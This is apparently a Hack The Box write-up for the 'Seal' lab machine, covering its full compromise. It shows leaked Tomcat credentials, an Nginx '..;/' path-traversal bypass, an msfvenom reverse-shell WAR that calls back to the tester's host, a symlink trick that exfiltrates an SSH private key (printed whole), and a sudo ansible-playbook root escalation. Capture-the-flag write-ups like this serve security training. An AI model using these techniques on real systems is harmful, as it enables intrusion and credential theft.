# [seal](https://app.hackthebox.eu/machines/Seal)

> A Linux box serving a [GitBucket] instance and a custom web application for **Seal Market**, a vegetable market in Europe. The custom web application is ran via Apache Tomcat with an Nginx reverse proxy. It is possible to register an account on the GitBucket instance, which contains a repository for the custom **Seal Market** web application. Going through the repository's commit history reveals credentials to the Tomcat management interface. Using these credentials grants access to the Tomcat management status page, but not the full management page capable of code execution. According to the repository, the Nginx configuration will only allow access to the management interface if the client presents a certificate signed by the server's certificate authority. This isn'y likely to happen. However, an [Acunetix article](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) indicates that Nginx and Tomcat don't serialize paths consistently and thus, path traversal can be utilized to bypass the Nginx client certificate restrictions and access the Tomcat management interface. With access to this, it is possible to upload and execute a JAR reverse shell and gain access to the machine as the `tomcat` user. A cron job has the `luis` user using Ansible to archive a directory that is writable by `tomcat`. By creating a symbolic link to `luis`'s `~/.ssh` directory, it is possible to extract `luis`'s SSH private key from one of these archives. `luis` is capable of running `ansible-playbook` as `root`, which can be used to gain full access to the target as `root`.

---

## Open Port Enumeration

### TCP

```bash
$ masscan -p1-65535 10.10.10.250 --rate=1000 -e tun0 --output-format grepable --output-filename seal.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-02 02:06:30 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat seal.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,443,8080,
```

```bash
$ nmap -sC -sV -O -p22,443,8080 10.10.10.250 -oA seal
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-01 22:11 EDT
Nmap scan report for 10.10.10.250
Host is up (0.046s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-nextprotoneg:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 401 Unauthorized
|     Date: Sat, 02 Oct 2021 02:11:31 GMT
|     Set-Cookie: JSESSIONID=node01jj5divjmicmp1f8jpk4c4iv0o21865.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest:
|     HTTP/1.1 401 Unauthorized
|     Date: Sat, 02 Oct 2021 02:11:31 GMT
|     Set-Cookie: JSESSIONID=node0fq1imgh8i5kf1u8jeg4t5bjtn21863.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 02 Oct 2021 02:11:31 GMT
|     Set-Cookie: JSESSIONID=node01fbhoabws6c894tdilll10q7a21864.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck:
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest:
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4:
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5:
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=10/1%Time=6157BFD9%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F8,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Sat,\x2002\x2
SF:0Oct\x202021\x2002:11:31\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0fq1im
SF:gh8i5kf1u8jeg4t5bjtn21863\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x2
SF:0Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,10C,
SF:"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2002\x20Oct\x202021\x2002:11:
SF:31\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01fbhoabws6c894tdilll10q7a21
SF:864\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x20
SF:1970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\n
SF:Allow:\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x2
SF:0text/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x
SF:20close\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x2
SF:0Version</pre>")%r(FourOhFourRequest,F9,"HTTP/1\.1\x20401\x20Unauthoriz
SF:ed\r\nDate:\x20Sat,\x2002\x20Oct\x202021\x2002:11:31\x20GMT\r\nSet-Cook
SF:ie:\x20JSESSIONID=node01jj5divjmicmp1f8jpk4c4iv0o21865\.node0;\x20Path=
SF:/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20
SF:GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200
SF:\r\n\r\n")%r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNT
SF:L=0x5\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Lengt
SF:h:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><
SF:pre>reason:\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HT
SF:TP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20
SF:character\x20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illega
SF:l\x20character\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-
SF:8859-1\r\nContent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\
SF:x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x8
SF:0</pre>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds
```

The OpenSSH string indicates the target is Ubuntu 20.04.

The port 443 appears to be using an Nginx reverse proxy. Its output also leaked the hostname `seal.htb`. Add this hostname to the local DNS resolver.

Port 8080 is returning a cookie named `JSESSIONID`, which indicates the backend could be some kind of `Java` application. Tomcat, perhaps?

### UDP

```bash
$ nmap -sU 10.10.10.250
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-01 22:09 EDT
Nmap scan report for 10.10.10.250
Host is up (0.047s latency).
All 1000 scanned ports on 10.10.10.250 are in ignored states.
Not shown: 960 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 1040.70 seconds
```

No open UDP ports.

---

## Port 8080 Enumeration

Port 8080 appears to be hosting a [GitBucket](https://github.com/gitbucket/gitbucket) web application (HTTP). GitBucket is a Git web platform powered by [Scala](https://www.scala-lang.org/).

![](images/Pasted%20image%2020211001223506.png)

The home page is a sign in form (`/signin`) with a link to create an account (`/register`).

![](images/Pasted%20image%2020211001225136.png)

### Content Discovery

```bash
$ gobuster dir -u http://seal.htb:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://seal.htb:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/01 22:44:46 Starting gobuster in directory enumeration mode
===============================================================
/register             (Status: 200) [Size: 8982]
/signin               (Status: 200) [Size: 6892]

===============================================================
2021/10/01 22:48:15 Finished
===============================================================
```

Nothing new.

### Virtual Host Discovery

```bash
$ gobuster vhost -u http://seal.htb:8080 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://seal.htb:8080
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/01 22:45:28 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2021/10/01 22:45:52 Finished
===============================================================
```

Nothing.

### Manual Enumeration

Creat an account and log in.

There are two repositories: `root/seal_market` and `root/infra`. The former appears to be the source code of the web application running on port 443, including the Nginx and Tomcat configurations. The latter appears to be Ansible playbooks for deploying Tomcat.

The README in the `seal_market` repository has a to do list:

![](images/Pasted%20image%2020211001230830.png)

One of the items is to deploy the updated Tomcat configuration, `tomcat/tomcat-users.xml`. This file generally contains the users who are capable of logging into the Tomcat management interface, but the file doesn't have any users in the current commit. Looking through the repository's commit history, it appears that an earlier commit, `ac21032`, has the original version of `tomcat/tomcat-users.xml`, containing the Tomcat credentials `tomcat:42MrHBf*z8{Z%`.

![](images/Pasted%20image%2020211001231430.png)

---

## Port 443 Enumeration

The web application on port 443 appears to be the website of *Seal Market*, a vegetable market in Europe. All of the links on the home page are dead. There are various input forms on the page for searching for products, submitting a contact form, or subscribing to a newsletter, but all of the them appear to simply submit the input as query parameters in a `GET` request back to `/`.

A request to a nonexist URL path returns an error page that indicates the backend web application is being hosted by Apache Tomcat version 9.0.31.

![](images/Pasted%20image%2020211001222855.png)

### Content Discovery

```bash
$ gobuster dir -u https://seal.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://seal.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/01 22:31:08 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> http://seal.htb/images/]
/admin                (Status: 302) [Size: 0] [--> http://seal.htb/admin/]
/js                   (Status: 302) [Size: 0] [--> http://seal.htb/js/]
/css                  (Status: 302) [Size: 0] [--> http://seal.htb/css/]
/manager              (Status: 302) [Size: 0] [--> http://seal.htb/manager/]
/.                    (Status: 200) [Size: 19737]
/icon                 (Status: 302) [Size: 0] [--> http://seal.htb/icon/]

===============================================================
2021/10/01 22:34:39 Finished
===============================================================
```

Interestingly, each of these redirects from HTTPS to HTTP, which this machine isn't serving. This transport layer redirect is probably the work of the Nginx reverse proxy. All requests return a 404, except `https://seal.htb/manager/` which returns a 403 Forbidden.

### Virtual Host Discovery

```bash
$ gobuster vhost -k -u https://seal.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://seal.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/01 22:32:09 Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.seal.htb (Status: 400) [Size: 2254]

===============================================================
2021/10/01 22:32:36 Finished
===============================================================
```

Nothing here.

---

## Tomcat Enumeration

The `seal_market` repository indicates that this web application is running via Apache Tomcat. Perform content discovery against the web application using a Tomcat-specific word list.

```bash
$ gobuster dir -u https://seal.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/tomcat.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://seal.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/tomcat.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/01 23:17:06 Starting gobuster in directory enumeration mode
===============================================================
/examples/../manager/html (Status: 403) [Size: 162]
/examples/%2e%2e/manager/html (Status: 403) [Size: 162]
/host-manager         (Status: 302) [Size: 0] [--> http://seal.htb/host-manager/]
/host-manager/html/*  (Status: 403) [Size: 162]
/manager              (Status: 302) [Size: 0] [--> http://seal.htb/manager/]
/manager/html         (Status: 403) [Size: 162]
/manager/html/*       (Status: 403) [Size: 162]
/manager/jmxproxy     (Status: 401) [Size: 2499]
/manager/jmxproxy/*   (Status: 401) [Size: 2499]
/manager/status/*     (Status: 401) [Size: 2499]
/manager/status.xsd   (Status: 200) [Size: 4374]

===============================================================
2021/10/01 23:17:07 Finished
===============================================================
```

`/manager/status` returns an HTTP login form which the credentials from GitBucket allow access through. It is a Tomcat server status interface.

![](images/Pasted%20image%2020211001232104.png)

However, `/manager/html` is the key to command execution on the target and it still returns a 403 Forbidden.

---

## 403 Bypass & Payload Execution

[This article](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) from Acunetix describes how Tomcat and Nginx normalize paths inconsistently. Apparently, Nginx won't normalize the path `/..;/` but will instead forward it to the server as is. On the other hand, Tomcat will normalize `/..;/` into `/../`. This means that it is possible to access `/manager/html` by browsing to `/manager/status/..;/html`.

![](images/Pasted%20image%2020211002004301.png)

From this interface, generate and upload a `jar` reverse shell payload.

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.164 LPORT=443 -f war -o tgihf.war
Payload size: 1101 bytes
Final size of war file: 1101 bytes
Saved as: tgihf.war
```

Attempting to upload the payload through the web interface will fail because it will attempt to upload directly to `/manager/html/upload`, which will return a 403 Forbidden. Intercept the request in BurpSuite and change the URL path to `/manager/status/..;/html/upload`.
The request:

```http
POST /manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=6E3CAE279F23B9F275063F93F4A55A35 HTTP/1.1
Host: seal.htb
Cookie: JSESSIONID=59E060457FEB6244E68C567F604A8FF7; JSESSIONID=node0d7c9ladkjhtf6svhfg13supr21900.node0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------414677531440330725221748963814
Content-Length: 1341
Origin: https://seal.htb
Dnt: 1
Authorization: Basic dG9tY2F0OjQyTXJIQmYqejh7WiU=
Referer: https://seal.htb/manager/status/..;/html
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

-----------------------------414677531440330725221748963814
Content-Disposition: form-data; name="deployWar"; filename="tgihf.war"
Content-Type: application/x-webarchive

...[PAYLOAD SNIPPED]...
-----------------------------414677531440330725221748963814--
```

The payload was uploaded successfully.

![](images/Pasted%20image%2020211002004756.png)

Start the listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Click on the linked name of the payload in the Tomcat management interface to execute the reverse shell.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.164] from (UNKNOWN) [10.10.10.250] 41578
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

---

## Tomcat to Luis

The reverse shell runs under the `tomcat` user in the `/var/lib/tomcat9/` directory. There are no configuration files or anything of interest regarding privilege escalation in the immediate vicinity.

Run [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) on the target and note the interesting process running by the user `luis`.

```bash
...[SNIP]...
root      267205  0.0  0.0   8356  3448 ?        S    05:11   0:00  _ /usr/sbin/CRON -f
root      267206  0.0  0.0   2608   612 ?        Ss   05:11   0:00      _ /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
...[SNIP]...
```

An [Ansible](https://www.ansible.com/) playbook `/opt/backups/playbook/run.yml` is being executed approximately every 30 seconds. The playbook:

```yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

The playbook recursively copies all files in `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` into `/opt/backups/files`. It then compresses the files in `/opt/backups/files` into an archive `/opt/backups/archives/backup-$DATE-$TIME.gz`. It then removes the files from `/opt/backups/files`.

Note the extra argument that is passed into the first task: `copy_links=yes`. According to the documentation for Ansible's [synchronize](https://docs.ansible.com/ansible/latest/collections/ansible/posix/synchronize_module.html) task, `copy_links=yes` "[copies] symlinks as the item that they point to (the referent), rather than the symlink [itself]." Since the playbook is running as `luis`, if a symlink to `/home/luis/.ssh` is somewhere under the `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` directory, the contents of this directory will be copied and archived up, including `luis`'s SSH private key. Since `tomcat` can write to `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads`, this is possible.

```bash
$ ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/tgihf-ssh
```

Continually list `/opt/backups/archives` until a new archive appears. When it does, `gzip` decompress and untar the archive and make note of `luis`'s SSH private key.

```bash
$ gzip -d backup-2021-10-02-05:37:32.gz
$ tar -zvf backup-2021-10-02-05:37:32
$ cat dashboard/uploads/tgihf-ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
```

Use `luis`'s SSH key to login to the target and read the user flag.

---

## Luis to Root

`luis` is able to execute `/usr/bin/ansible-playbook` as `root` using `sudo`.

```bash
$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

According to [GTFOBins](https://gtfobins.github.io/gtfobins/ansible-playbook/), this can be abused to escalate privileges like so:

```bash
$ TF=$(mktemp)
$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
$ sudo ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] *************************************************************************************************************

TASK [Gathering Facts] *******************************************************************************************************
ok: [localhost]

TASK [shell] *****************************************************************************************************************
# id
uid=0(root) gid=0(root) groups=0(root)
```
